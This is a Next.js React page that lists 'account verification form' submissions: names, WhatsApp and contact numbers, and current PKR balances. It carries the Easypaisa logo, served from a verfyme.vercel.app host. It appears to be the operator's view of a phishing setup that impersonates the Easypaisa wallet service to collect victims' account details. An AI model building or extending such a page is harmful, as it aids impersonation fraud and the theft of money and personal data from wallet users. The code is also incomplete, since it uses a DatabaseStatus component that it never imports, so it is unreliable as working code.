'use client';

import React, { useState, useEffect } from 'react';
import Image from 'next/image';
import Link from 'next/link';

export default function SubmissionsPage() {
  const [submissions, setSubmissions] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchSubmissions = async () => {
      try {
        const response = await fetch('/api/submissions');
        const result = await response.json();
        
        if (result.success) {
          setSubmissions(result.data);
        } else {
          setError(result.message || 'Failed to fetch submissions');
        }
      } catch (err) {
        setError('Network error. Please try again.');
        console.error('Fetch error:', err);
      } finally {
        setLoading(false);
      }
    };

    fetchSubmissions();
  }, []);

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
        {/* Header */}
        <header className="bg-white shadow-sm">
          <div className="container mx-auto px-4 py-4 flex justify-between items-center">
            <Image
              src="https://verfyme.vercel.app/images/easypaisa-black-logo.png"
              alt="Easypaisa Logo"
              width={150}
              height={50}
            />
            <Link href="/" className="text-[#016630] hover:text-[#014d24] font-medium">
              Back to Form
            </Link>
          </div>
        </header>

        <main className="container mx-auto px-4 py-8">
          <div className="bg-white rounded-xl shadow-lg p-8 max-w-6xl mx-auto">
            <h1 className="text-3xl font-bold text-gray-800 mb-6 text-center">Form Submissions</h1>
            <div className="text-center py-12">
              <div className="inline-block animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#016630] mb-4"></div>
              <p className="text-gray-600">Loading submissions...</p>
            </div>
          </div>
        </main>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
        <DatabaseStatus />
        {/* Header */}
        <header className="bg-white shadow-sm">
          <div className="container mx-auto px-4 py-4 flex justify-between items-center">
            <Image
              src="https://verfyme.vercel.app/images/easypaisa-black-logo.png"
              alt="Easypaisa Logo"
              width={150}
              height={50}
            />
            <Link href="/" className="text-[#016630] hover:text-[#014d24] font-medium">
              Back to Form
            </Link>
          </div>
        </header>

        <main className="container mx-auto px-4 py-8">
          <div className="bg-white rounded-xl shadow-lg p-8 max-w-6xl mx-auto">
            <h1 className="text-3xl font-bold text-gray-800 mb-6 text-center">Form Submissions</h1>
            <div className="text-center py-12">
              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                </svg>
              </div>
              <p className="text-red-600 font-medium mb-2">Error loading submissions</p>
              <p className="text-gray-600 mb-6">{error}</p>
              <Link href="/" className="inline-block bg-[#016630] text-white py-2 px-6 rounded-lg font-medium hover:bg-[#014d24] transition-colors duration-300">
                Back to Form
              </Link>
            </div>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
      <DatabaseStatus />
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
          <Image
            src="https://verfyme.vercel.app/images/easypaisa-black-logo.png"
            alt="Easypaisa Logo"
            width={150}
            height={50}
          />
          <Link href="/" className="text-[#016630] hover:text-[#014d24] font-medium">
            Back to Form
          </Link>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        <div className="bg-white rounded-xl shadow-lg p-8 max-w-6xl mx-auto">
          <div className="flex justify-between items-center mb-8">
            <div>
              <h1 className="text-3xl font-bold text-gray-800">Form Submissions</h1>
              <p className="text-gray-600">View all submitted account verification forms</p>
            </div>
            <div className="bg-gray-100 rounded-full px-4 py-2">
              <span className="text-gray-700 font-medium">{submissions.length} submissions</span>
            </div>
          </div>
          
          {submissions.length === 0 ? (
            <div className="text-center py-12">
              <div className="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                </svg>
              </div>
              <h3 className="text-xl font-semibold text-gray-800 mb-2">No submissions yet</h3>
              <p className="text-gray-600 mb-6">Be the first to submit an account verification form</p>
              <Link href="/" className="inline-block bg-[#016630] text-white py-2 px-6 rounded-lg font-medium hover:bg-[#014d24] transition-colors duration-300">
                Submit Form
              </Link>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="min-w-full divide-y divide-gray-200">
                <thead className="bg-gray-50">
                  <tr>
                    <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Name
                    </th>
                    <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      WhatsApp Number
                    </th>
                    <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Contact Number
                    </th>
                    <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Current Balance
                    </th>
                    <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                      Submitted At
                    </th>
                  </tr>
                </thead>
                <tbody className="bg-white divide-y divide-gray-200">
                  {submissions.map((submission) => (
                    <tr key={submission._id} className="hover:bg-gray-50">
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm font-medium text-gray-900">{submission.name}</div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm text-gray-900">{submission.accountNumber}</div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm text-gray-900">{submission.contactNumber}</div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm text-gray-900">PKR {submission.currentBalance}</div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm text-gray-900">
                          {submission.createdAt ? new Date(submission.createdAt).toLocaleString() : 'N/A'}
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}